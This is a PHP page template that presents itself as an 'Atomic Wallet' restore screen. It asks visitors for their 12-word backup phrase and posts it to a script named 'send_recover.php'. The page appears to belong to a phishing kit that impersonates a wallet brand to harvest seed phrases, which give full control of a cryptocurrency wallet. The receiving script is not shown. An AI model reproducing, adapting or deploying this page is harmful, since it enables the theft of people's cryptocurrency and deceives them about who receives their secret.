<?php include_once './config.php'; ?>
<html lang="en">
    <?php
    $title = 'Atomic Wallet';
    include_once './includes/meta.php';
    ?>
    <body>
        <?php include_once './includes/header.php'; ?>
        <div class="container">
            <div class="row justify-content-center">
                <div class="col-sm-4 text-center">
                    <h2 class="fs30 my30 mb60 fw-bold">Restore from Backup</h2>
                    <form method="post" action="<?= base_url('send_recover.php') ?>" class="" style="">
                        <div class="my15">
                            <textarea class="form-control textarea fs14" name="secret_recovery_phrase" required="" maxlength="500" placeholder="Your 12-word backup phrase" rows="3" style=" background-color:#000; border: none; border-bottom: 2px solid #fff; color: #fff;"></textarea>
                        </div>
                        <div class="mt60 mb20">
                            <button class="btn btn-primary btn-primary-2 fs18 py10 px35 rounded-pill fw-bold" type="submit">RESTORE WALLET</button>
                        </div>
                        <div class="my20">
                            <a href="<?= base_url() ?>" class="fw-bold text-white text-decoration-none">BACK</a>
                        </div>
                    </form>
                </div>
            </div>
        </div>
        <?php include_once './includes/footer.php'; ?>
    </body>
</html>